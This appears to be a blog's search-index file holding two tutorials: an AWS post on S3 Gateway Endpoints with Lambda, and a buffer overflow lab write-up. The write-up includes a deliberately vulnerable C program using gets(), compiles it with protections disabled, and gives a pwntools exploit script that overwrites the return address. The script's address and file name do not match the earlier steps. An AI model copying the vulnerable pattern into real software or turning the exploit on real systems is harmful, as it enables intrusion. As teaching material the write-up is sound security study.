        <content type="html"><![CDATA[<h1 id="What-is-S3-Gateway-Endpoints"><a href="#What-is-S3-Gateway-Endpoints" class="headerlink" title="What is S3 Gateway Endpoints?"></a>What is S3 Gateway Endpoints?</h1><p><img src="https://i.imgur.com/MUsKNi4.png" alt="Imgur"></p><p>Let’s consider a scenario</p><blockquote><p>How could your Lambda function access the content in the S3 bucket?</p></blockquote><p>If you want a service to access the content in the S3 bucket, it usually go through VPC endpoint. S3 supports two types of VPC endpoint,each of which is <strong>Gateway endpoint</strong> and <strong>Interface endpoint</strong></p><!--如果要通過一個服務來存取 S3 當中的內容，通常是會通過 VPC Endpoint，而在 S3 當中又支援兩種不同的 VPC Endpoint類型，分別是 **Gateway Endpoint** 以及 **Interface Endpoint**--><p>The diffeences between two types of VPC endpoints are listed below</p><table><thead><tr><th>S3 Gateway Endpoints</th><th>S3 Interface Endpoints</th></tr></thead><tbody><tr><td>Use S3 Public IP Address</td><td>Use Private IP Address in VPC to access S3</td></tr><tr><td>Use the same S3 DNS Name</td><td>Name must include VPC Endpoint ID [3]</td></tr><tr><td>cannot access internally</td><td>can access internally</td></tr><tr><td>cannot access from other AWS region</td><td>can access from other AWS region by using VPC peering or AWS Transit gateway</td></tr><tr><td>Free</td><td>In chrarge</td></tr></tbody></table><!-- >> **所以當你的情境是你在同個 Region 底下有個 Lambda 函數想要存取 S3 的內容，那就很適合使用 Gateway Endpoint** --><blockquote><p>So if your scenario is that a Lambda function want to access the content in S3 bucket in the same region, it is great to utilize the Gateway Endpoint</p></blockquote><h2 id="Consideration-of-S3-Gateway-Endpoint"><a href="#Consideration-of-S3-Gateway-Endpoint" class="headerlink" title="Consideration of S3 Gateway Endpoint"></a>Consideration of S3 Gateway Endpoint</h2><p>It is worth to mestion that there are several things you need to consider before choosing S3 Gateway Endpoints, make sure you go through the section in the official documentation</p><blockquote><p><a href="https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints-s3.html#gateway-endpoint-considerations-s3">https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints-s3.html#gateway-endpoint-considerations-s3</a></p></blockquote><h2 id="Private-DNS"><a href="#Private-DNS" class="headerlink" title="Private DNS"></a>Private DNS</h2><p>When you are trying yo create Gateway Endpoint or Interface Endpoint for your S3, you can decide creating private DNS for cost down.</p><blockquote><p>This is implement by Route53 Resolver<br>For detail you can check：<a href="https://docs.aws.amazon.com/zh_tw/Route53/latest/DeveloperGuide/resolver.html">https://docs.aws.amazon.com/zh_tw/Route53/latest/DeveloperGuide/resolver.html</a></p></blockquote><h1 id="Steps-for-building-Gateway-Endpoint"><a href="#Steps-for-building-Gateway-Endpoint" class="headerlink" title="Steps for building Gateway Endpoint"></a><a href="https://docs.aws.amazon.com/zh_tw/vpc/latest/privatelink/vpc-endpoints-s3.html#create-gateway-endpoint-s3">Steps for building Gateway Endpoint</a></h1><ul><li>Go to AWS Console to create the endpoint</li></ul><blockquote><p>VPC &#x2F; Endpoints &#x2F; Create Endpoint</p></blockquote><p><img src="https://i.imgur.com/asOslk6.png" alt="Imgur"></p><ul><li>Choose <code>AWS services</code> , and <code>com.amaazonaws.us-east-1.s3</code></li></ul><p><img src="https://i.imgur.com/ujgXmUq.png" alt="Imgur"></p><ul><li>Then, press create endpoints</li></ul><h2 id="Associate-Route-Table"><a href="#Associate-Route-Table" class="headerlink" title="Associate Route Table"></a>Associate Route Table</h2><ul><li>Make sure the route table that assoicate to the gateway endpoint is clean.<blockquote><p>If you don’t have on, then make one.</p></blockquote></li></ul><p><img src="https://i.imgur.com/cI4mrOt.png" alt="Imgur"></p><h2 id="Configure-policy"><a href="#Configure-policy" class="headerlink" title="Configure policy"></a>Configure policy</h2><ul><li>For testing purposes, I choose <code>Full Access</code></li></ul><p><img src="https://i.imgur.com/kiQtSej.png" alt="Imgur"></p><ul><li>Then, press create endpoint</li></ul><h2 id="Check-the-routing"><a href="#Check-the-routing" class="headerlink" title="Check the routing"></a>Check the routing</h2><p>After establishing the endpoint, you can check if the default route of route table is well configured</p><p><img src="https://i.imgur.com/3Ajfl91.png" alt="Imgur"></p><p>Next, we must configure a Lambda function for accessing S3 bucket.</p><h2 id="Configure-Lambda-Function"><a href="#Configure-Lambda-Function" class="headerlink" title="Configure Lambda Function"></a>Configure Lambda Function</h2><p>If you put a Lambda funciton into a VPC, it will attach to 2 subnets by defaults.</p><p>Make sure two subnet have default route to S3 Gateway Endpoints.</p><p><img src="https://i.imgur.com/XmbfUKe.png" alt="Imgur"><br><img src="https://i.imgur.com/AP6fZGy.png" alt="Imgur"></p><ul><li>Create Lambda function, and enable the VPC</li></ul><p><img src="https://i.imgur.com/eBfWExA.png" alt="Imgur"></p><ul><li>Lambda Code</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> boto3</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lambda_handler</span>(<span class="params">event, context</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;CREATE CLIENT&quot;</span>)</span><br><span class="line">    s3 = boto3.client(<span class="string">&quot;s3&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;START REQUEST&quot;</span>)</span><br><span class="line">    resp = s3.list_objects(Bucket=<span class="string">&quot;testbucket4-s3gateway-endpoint&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(resp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&#x27;statusCode&#x27;</span>: <span class="number">200</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: json.dumps(<span class="string">&#x27;Hello from Lambda!&#x27;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>In this Lambda code, Lambda will try to list the objects in the bucket, can print out the information of  response object in the log.</p><ul><li>Configure policy of Lambda execution role</li></ul><p>I simply attach AWS Managed Policy <code>AmazonS3FullAccess</code> to the execution role for testing</p><blockquote><p>Notice, you should not give full access to your Lambda function in production mode, make sure giving adequient permssion to the role.</p></blockquote><p><img src="https://i.imgur.com/U3mPX0h.png" alt="Imgur"></p><h2 id="Check-invocations"><a href="#Check-invocations" class="headerlink" title="Check invocations"></a>Check invocations</h2><ul><li>Press <code>test</code> button in the Lambda console, you’ll noticee the lambda get invoked successfully</li></ul><p><img src="https://i.imgur.com/WB3iyyD.png" alt="Imgur"></p><ul><li>Then you need to check the invocation logs in CloudWatch</li></ul><p><img src="https://i.imgur.com/j5q8yCp.png" alt="Imgur"></p><p>You can see that the object information were listed and printed out in the invocation logs.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] <a href="https://docs.aws.amazon.com/zh_tw/vpc/latest/privatelink/vpc-endpoints-s3.html#create-gateway-endpoint-s3">https://docs.aws.amazon.com/zh_tw/vpc/latest/privatelink/vpc-endpoints-s3.html#create-gateway-endpoint-s3</a><br>[2] <a href="https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#types-of-vpc-endpoints-for-s3">https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#types-of-vpc-endpoints-for-s3</a><br>[3] <a href="https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#accessing-s3-interface-endpoints">https://docs.aws.amazon.com/zh_tw/AmazonS3/latest/userguide/privatelink-interface-endpoints.html#accessing-s3-interface-endpoints</a></p>]]></content>
      
      
      <categories>
          
          <category> Hands-On Practices </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> S3 </tag>
            
            <tag> Endpoints </tag>
            
            <tag> Gateway </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buffer Overflow Vulnerability Experiment</title>
      <link href="/en/posts/Buffer_Overflow_Test.html"/>
      <url>/en/posts/Buffer_Overflow_Test.html</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><strong>Buffer Overflow Vulnerability</strong> is one of the most common and severe security vulnerabilities in the field of software and system security. In the complex software systems of today’s digital age, the threat from hackers or malicious users is ever-present. Buffer Overflow Vulnerability is one of the most concerning threats among them due to the significant threat it poses to computer systems.</p><p>In simple terms, a buffer overflow vulnerability occurs when code attempts to store data in a predefined size of memory block known as a <strong>buffer</strong>. If the amount of data input exceeds the maximum capacity of the buffer, the excess data will overflow into adjacent memory areas, potentially overwriting instructions or data that control program execution, leading to unexpected behavior.</p><p>The fundamental cause of buffer overflow vulnerabilities is negligence and errors in program design. When developers fail to handle user input correctly, especially when they do not perform sufficient validation and restrictions on the input, it may lead to such vulnerabilities. Attackers often exploit these unchecked inputs by sending specially crafted malicious data, triggering buffer overflow attacks. This attack method has been around for many years and has caused numerous serious security incidents throughout history.</p><p>In the past, several well-known buffer overflow vulnerabilities have been widely reported, some of which have had profound impacts on global information security. For example, the infamous <code>Code Red</code> and <code>Nimda</code> worms utilized buffer overflow vulnerabilities to rapidly infect tens of thousands of hosts. Similarly, the <code>Slammer</code> worm exploited a buffer overflow vulnerability in Microsoft SQL Server, causing a sudden surge in global internet traffic. These events emphasize the need for the entire tech industry to take buffer overflow vulnerabilities seriously.</p><blockquote><p>SQL Slammer - <a href="https://en.wikipedia.org/wiki/SQL_Slammer">https://en.wikipedia.org/wiki/SQL_Slammer</a></p></blockquote><p>So, this article aims to conduct a simple experiment on buffer overflow vulnerabilities to provide at least a conceptual understanding.</p><h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p>In terms of environment setup, we use the <strong>Windows Subsystem for Linux (WSL)</strong> platform to configure the development environment and use <code>Ubuntu 20.04 LTS</code> as the development environment. We will install the necessary tools in this environment, including <code>Python3</code>, <code>Pwntool</code>, and the <code>PEDA</code> plugin for GDB debugging.</p><p>WSL provides a feature to run Linux distributions on Windows systems, enabling us to perform Linux-related development work in a Windows environment. Ubuntu 20.04 LTS is a stable and common Linux distribution widely used in development and testing environments.</p><p>Before configuring the environment, we need to ensure that WSL is installed and running. Installation instructions for WSL can be found in the Microsoft official documentation or relevant online tutorials.</p><blockquote><p><a href="https://learn.microsoft.com/zh-tw/windows/wsl/install">https://learn.microsoft.com/zh-tw/windows/wsl/install</a></p></blockquote><p>Next, we need to install Python3 and Pwntool in WSL. Pwntool is a common Python library used in CTFs, specifically designed for exploit development.</p><p>Before installing Pwntool, we need to make sure that git is installed in WSL. If not installed, it can be done using the following commands:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure><p>Next, we can install <code>Pwntool</code> as follows:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3 python3-pip</span><br><span class="line">pip3 install --upgrade pip</span><br><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></figure><p>Now we have completed the installation of Python3 and Pwntool in WSL.</p><p>Finally, we will configure the GDB DEBUG environment, using the PEDA plugin to assist us in practicing buffer overflow vulnerabilities.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/longld/peda.git ~/peda</span><br><span class="line">echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><p>Lastly, here is a simple C program <code>buffer_test.c</code> used as the target for demonstrating the buffer overflow vulnerability. The program includes a <code>uname()</code> function that uses the <code>gets()</code> function to receive user input, but it does not perform sufficient validation on the input, potentially leading to a buffer overflow vulnerability.</p><p>buffer_test.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">target</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Oh No! Your Hacker.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">uname</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input your name: \n&quot;</span>);</span><br><span class="line">    gets(str);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s \n&quot;</span>, str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);  <span class="comment">//Clear buffer</span></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    uname();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="note info flat"><p>The program contains the risky input function <strong>gets</strong>, used for practicing Buffer Overflow.</p></div><h2 id="Experimental-Steps"><a href="#Experimental-Steps" class="headerlink" title="Experimental Steps"></a>Experimental Steps</h2><h3 id="Compile-the-Program"><a href="#Compile-the-Program" class="headerlink" title="Compile the Program"></a>Compile the Program</h3><p>First, we need to compile the code named <code>buffer_test.c</code> for further experimentation. During compilation, we need to disable the <strong>Stack Canary</strong> protection mechanism using the following command:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc buffer_test.c -o buffer_test -fno-stack-protector -no-pie</span><br></pre></td></tr></table></figure><div class="note info flat"><p><code>-fno-stack-protector</code> : Disable the Stack Canary protection mechanism.</p></div><h2 id="Check-Protective-Measures"><a href="#Check-Protective-Measures" class="headerlink" title="Check Protective Measures"></a>Check Protective Measures</h2><p>Before starting the experiment, it is necessary to confirm the security protective measures of the target program. The <code>checksec</code> command can quickly check the relevant security measures of the target executable:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec buffer_test</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/HuO3k3R.png"></p><h2 id="Confirm-the-Target"><a href="#Confirm-the-Target" class="headerlink" title="Confirm the Target"></a>Confirm the Target</h2><p>Before launching an attack, we need to identify the target. In this experiment, our goal is to execute the <code>target</code> function, so we need to find the memory address of that function and overwrite the function’s return address.</p><h2 id="Confirm-Function-Memory-Address"><a href="#Confirm-Function-Memory-Address" class="headerlink" title="Confirm Function Memory Address"></a>Confirm Function Memory Address</h2><p>Use GDB to query the memory address of the <code>target</code> function:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb buffer_test</span><br><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">disas target</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/l1S7BAX.png"></p><p>From the above image, the starting address of this function is <code>0x0000000000401196</code> . Knowing the address of the function, the next step is to understand how to overwrite the ret address from input.</p><h2 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h2><p>Before launching an actual attack, let’s run the program in GDB and observe its behavior:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">gdb-peta$ </span><span class="language-bash">r    // Run it first</span></span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/jdWT4BI.png"></p><p>The program will prompt the user to input a name, and after entering the name, it responds with <code>&quot;Hello, &#123;name&#125;&quot;</code>. Since the array in the original program that holds user input is only 16 bytes (<code>RBP ~ RBP-16</code>), <strong>we can observe its behavior by inputting data exceeding 16 bytes</strong>.</p><p><img src="https://i.imgur.com/HOnCJiX.png" alt="Imgur"></p><p>As shown in the image, when input exceeds 24 bytes, a buffer overflow occurs, and a crash occurs after the <strong>v</strong> character. This indicates that we need at least 24 bytes of input to successfully overwrite the function’s return address.</p><blockquote><p>So, it can be covered with 8 Bytes to overwrite the ret address.</p></blockquote><blockquote><p>RBP shows only up to ‘qrstuvwx’, meaning it crashed when input reached 24 bytes.</p></blockquote><h2 id="Actual-Overwriting-with-Python"><a href="#Actual-Overwriting-with-Python" class="headerlink" title="Actual Overwriting with Python"></a>Actual Overwriting with Python</h2><p>為了進行實際的攻擊，將使用 Python 撰寫攻擊腳本。這個腳本將使用 <code>Pwntools</code> 函式庫來進行攻擊，蓋過程式中的函式返回位址，使之執行 <code>target</code> 函式。</p><p>To carry out the actual attack, a Python script will be used to overwrite the program’s function return address. This script will use the <code>Pwntools</code> library to perform the attack and execute the <code>target</code> function.</p><p>The attack script <code>attack.py</code> is as follows:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./demo&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;input your name:&#x27;</span>) </span><br><span class="line">targer_address = p64(<span class="number">0x400667</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">24</span> + targer_address)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>In the attack script, the <code>process()</code> function is used to execute the buffer_test program. Then, the <code>recvuntil()</code> function is used to wait for the program to display the prompt “input your name:”, after which the pre-calculated address of the <code>target</code> function is added to the input data. Finally, the <code>interactive()</code> function is used to enter interactive mode to observe the results of the attack.</p><ul><li><p><code>recvuntil()</code>: receive until, can receive a specific string, and execute the xx command when the target string is reached.</p></li><li><p><code>p8()</code>、<code>p32()</code>、<code>p64()</code></p><p> <img src="https://i.imgur.com/HZzm1tq.png"></p><ul><li><code>p32</code>: pack data (32-bit integer) for data &#x2F;&#x2F; u32: unpack</li><li><code>p64</code>: pack data (64-bit integer) for data &#x2F;&#x2F; u64: unpack</li></ul></li></ul><p>Convert to address</p><ul><li><code>sendline(payload)</code>: send payload and newline</li><li><code>interactive()</code>： enter interactive mode, used to execute local or remote executables</li></ul><h2 id="Execute-the-Attack-Script"><a href="#Execute-the-Attack-Script" class="headerlink" title="Execute the Attack Script"></a>Execute the Attack Script</h2><p>Finally, we run the attack script to perform the attack:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 attack.py</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Hr1LHfQ.png"></p><p>After a successful attack, the program will execute the <code>target</code> function and display the message “Oh No! Your Hacker.” This proves that we have successfully exploited the buffer overflow vulnerability.</p><div class="note success flat"><p>Successfully executed the target function!</p></div><div class="note warning flat"><p>Remember to ensure compliance with relevant laws and regulations when applying the knowledge gained in real-world environments, and only conduct security testing and exploitation in legally authorized situations.</p></div><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://mks.tw/2976/%e8%b3%87%e8%a8%8a%e5%ae%89%e5%85%a8-%e5%be%9e%e6%af%ab%e7%84%a1%e5%9f%ba%e7%a4%8e%e9%96%8b%e5%a7%8b-pwn-buffer-overflow">https://mks.tw/2976/%e8%b3%87%e8%a8%8a%e5%ae%89%e5%85%a8-%e5%be%9e%e6%af%ab%e7%84%a1%e5%9f%ba%e7%a4%8e%e9%96%8b%e5%a7%8b-pwn-buffer-overflow</a></p>]]></content>
      
      
      <categories>
          
          <category> Hands-On Practices </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> Security </tag>
            
            <tag> Linux </tag>
            
            <tag> Buffer Overflow </tag>
            
            <tag> exploit </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
